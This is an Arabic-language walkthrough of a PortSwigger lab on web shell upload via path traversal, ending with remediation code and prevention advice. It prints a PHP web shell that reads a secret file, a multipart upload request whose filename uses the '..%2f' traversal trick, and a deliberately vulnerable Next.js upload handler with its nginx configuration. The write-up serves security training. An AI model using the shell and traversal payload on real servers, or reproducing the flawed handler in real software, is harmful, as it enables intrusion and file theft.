# Lab: Web shell upload via path traversal

> **Category:** File Upload Vulnerabilities  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة رفع الملفات (File Upload) مع ثغرة **Path Traversal** في اسم الملف. الخادم يمنع تنفيذ ملفات PHP في المجلد الافتراضي، ولكن يمكننا استخدام `..%2f` (مسار traversal) لرفع الملف إلى مجلد أعلى (`/files`) حيث يُسمح بتنفيذ PHP، ثم تنفيذ Web Shell لقراءة `/home/carlos/secret`.

**الحساب:** `wiener:peter`

**المطلوب:** الحصول على السر (secret) وإرساله.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم المسار

- سجل الدخول بـ `wiener:peter`
- ارفع صورة عادية كـ avatar
- في Burp، لاحظ أن الصورة تُجلب من:
```
GET /files/avatars/test.jpg
```
- أرسل هذا الطلب إلى **Repeater**

### الخطوة 2: إنشاء Web Shell

- أنشئ ملفاً باسم `exploit.php` بالمحتوى:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### الخطوة 3: رفع الملف (الفحص الأولي)

- ارفع `exploit.php` كـ avatar
- **النتيجة:** تم رفع الملف بنجاح ✅ (الخادم لا يمنع رفع PHP)

### الخطوة 4: محاولة تنفيذ Web Shell (ستفشل)

- في Repeater، غيّر المسار إلى `exploit.php`:

```http
GET /files/avatars/exploit.php HTTP/1.1
```

**النتيجة:** الخادم يعرض محتوى الملف كنص عادي (لا ينفذه) ❌

السبب: مجلد `avatars` ممنوع منه تنفيذ PHP.

### الخطوة 5: اعتراض طلب رفع الملف

- ابحث عن طلب `POST /my-account/avatar` في **Proxy history**
- أرسله إلى **Repeater**

الطلب يبدو هكذا:

```http
POST /my-account/avatar HTTP/1.1
Content-Type: multipart/form-data; boundary=...

--boundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
--boundary--
```

### الخطوة 6: إضافة Path Traversal إلى اسم الملف

- غيّر `filename="exploit.php"` إلى:

```
filename="../exploit.php"
```

أرسل الطلب.

**النتيجة:** رسالة: "The file avatars/exploit.php has been uploaded" (تمت إزالة `../`)

### الخطوة 7: ترميز المسار (URL encoding)

- استخدم ترميز `/` كـ `%2f`:

```
filename="..%2fexploit.php"
```

أرسل الطلب.

**النتيجة:** رسالة: "The file avatars/../exploit.php has been uploaded" (لم تتم إزالة `../`!)

### الخطوة 8: تنفيذ Web Shell

- الآن اذهب إلى:

```
https://YOUR-LAB-ID.web-security-academy.net/files/exploit.php
```

أو في Repeater:

```http
GET /files/exploit.php HTTP/1.1
```

**النتيجة:** يظهر السر (secret) في الرد ✅

### الخطوة 9: إرسال السر

- انسخ السر
- ارجع إلى صفحة المختبر
- اضغط **Submit solution** والصق السر

### الخطوة 10: حل المختبر

بعد إرسال السر الصحيح، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **لماذا لا يعمل PHP في /files/avatars؟** | الخادم ممنوع من تنفيذ PHP في هذا المجلد |
| **كيف تجاوزناه؟** | باستخدام `..%2f` لرفع الملف إلى `/files` حيث يُسمح بتنفيذ PHP |
| **لماذا `%2f` وليس `/`؟** | الخادم يزيل `/` العادي، لكنه يفك ترميز `%2f` إلى `/` بعد التحقق |
| **ما هو المسار النهائي؟** | `/files/avatars/../exploit.php` = `/files/exploit.php` |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

1. الثقة المفرطة في اسم الملف (Path Traversal في اسم الملف)
2. فك ترميز URL (URL decode) بعد التحقق من الأمان
3. عدم توحيد قواعد منع التنفيذ عبر جميع المجلدات

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/upload.js - معالجة رفع الملف
import fs from 'fs';
import path from 'path';
import formidable from 'formidable';

export default function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  
  const form = formidable({});
  
  form.parse(req, (err, fields, files) => {
    const file = files.avatar;
    let filename = file.originalFilename;
    
    // خطأ: يزيل ../ فقط مرة واحدة
    filename = filename.replace(/\.\.\//g, '');
    
    // خطأ: يفك ترميز URL بعد التصفية
    filename = decodeURIComponent(filename);
    
    const uploadDir = path.join(process.cwd(), 'public/files/avatars');
    const targetPath = path.join(uploadDir, filename);
    
    fs.copyFileSync(file.filepath, targetPath);
    res.json({ success: true, filename });
  });
}
```

```nginx
# إعدادات Nginx - فقط مجلد avatars ممنوع تنفيذ PHP
location /files/avatars {
    location ~ \.php$ {
        return 403;
    }
}
# مجلد /files يسمح بتنفيذ PHP (الثغرة!)
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/upload.js - معالجة رفع الملف الآمنة
import fs from 'fs';
import path from 'path';
import formidable from 'formidable';
import { v4 as uuidv4 } from 'uuid';

export default function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();
  
  const form = formidable({});
  
  form.parse(req, (err, fields, files) => {
    const file = files.avatar;
    
    // التصحيح 1: تجاهل اسم الملف من المستخدم تماماً
    const extension = path.extname(file.originalFilename);
    const allowedExtensions = ['.jpg', '.png', '.gif'];
    
    if (!allowedExtensions.includes(extension.toLowerCase())) {
      return res.status(400).json({ error: 'Invalid file type' });
    }
    
    // التصحيح 2: استخدام اسم آمن (UUID)
    const safeFilename = `${uuidv4()}${extension}`;
    
    // التصحيح 3: إزالة أي محاولات Path Traversal من المسار
    const uploadDir = path.join(process.cwd(), 'public/files/avatars');
    const targetPath = path.join(uploadDir, safeFilename);
    
    // التصحيح 4: التأكد من أن المسار النهائي داخل المجلد المطلوب
    if (!targetPath.startsWith(uploadDir)) {
      return res.status(400).json({ error: 'Invalid path' });
    }
    
    fs.copyFileSync(file.filepath, targetPath);
    res.json({ success: true, filename: safeFilename });
  });
}
```

```nginx
# إعدادات Nginx - منع تنفيذ PHP في جميع مجلدات الملفات المرفوعة
location /files {
    location ~ \.php$ {
        return 403;
    }
}
```

**الخلاصة:** 
1. لا تثق في اسم الملف من المستخدم أبداً
2. استخدم أسماء عشوائية (UUID) للملفات المرفوعة
3. لا تفك ترميز URL بعد التصفية (أو افعلها قبلها)
4. وحّد قواعد منع التنفيذ عبر جميع المجلدات

---

## 🛡️ كيفية الوقاية (How to Prevent)

| الإجراء | الوصف |
|---------|-------|
| **إعادة تسمية الملف** | استخدم UUID بدلاً من اسم المستخدم |
| **منع Path Traversal** | لا تسمح بـ `../` أو `..%2f` في اسم الملف |
| **وحّد قواعد التنفيذ** | امنع تنفيذ PHP في كل مجلدات `/files` |
| **ترتيب العمليات الصحيح** | قم بـ URL decode قبل التصفية وليس بعدها |
| **تخزين خارج webroot** | ضع الملفات خارج المجلد العام كلما أمكن |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
- [File Upload Cheat Sheet](https://portswigger.net/web-security/file-upload)
